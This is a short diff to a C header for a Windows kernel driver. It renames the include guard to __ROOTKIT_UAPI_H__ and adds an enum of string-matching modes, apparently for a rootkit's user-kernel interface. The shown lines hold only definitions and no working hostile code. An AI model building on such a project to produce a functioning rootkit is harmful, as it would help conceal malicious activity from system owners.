@@ -1,5 +1,5 @@
-#ifndef __IOCTL_H__
-#define __IOCTL_H__
+#ifndef __ROOTKIT_UAPI_H__
+#define __ROOTKIT_UAPI_H__
 
 #ifdef _NTDDK_  // Are we compiling a driver?
 #include <ntifs.h>
@@ -17,4 +17,11 @@
 #define PID_SELF 0
 #define PID_PARENT -1
 
-#endif  // __IOCTL_H__
+typedef enum _MATCH_TYPE {          // Can be stored in 2 bits
+    MATCH_TYPE_EXACT = 0b00UL,      // Match the entire string
+    MATCH_TYPE_SUBSTRING = 0b01UL,  // Match anywhere in the string
+    MATCH_TYPE_PREFIX = 0b10UL,     // Match the beginning of the string
+    MATCH_TYPE_SUFFIX = 0b11UL,     // Match the end of the string
+} MATCH_TYPE, *PMATCH_TYPE;
+
+#endif  // __ROOTKIT_UAPI_H__
